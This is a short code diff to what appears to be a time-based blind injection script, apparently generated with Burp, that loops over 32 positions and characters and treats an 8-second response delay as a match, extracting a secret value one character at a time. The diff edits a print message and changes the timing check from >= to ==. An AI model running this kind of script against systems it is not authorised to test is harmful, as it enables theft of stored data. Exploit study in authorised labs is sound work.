@@ -20,8 +20,8 @@ for i in range(1,33):
         requests.get(burp0_url, headers=burp0_headers)
         end_time = time.time()
         control_time = end_time - start_time
-        print("Time it takes for %s: " %char + str(int(control_time)) + "seconds", end="\r")
-        if int(control_time) >= int(8):
+        print("Time it takes for ascii char %s: " %char + str(int(control_time)) + " seconds", end="\r")
+        if int(control_time) == int(8):
             print("Found %s at %s position, which took: %s seconds" % (char, i, str(int(control_time))), end="\r\n")
             result += char
             break
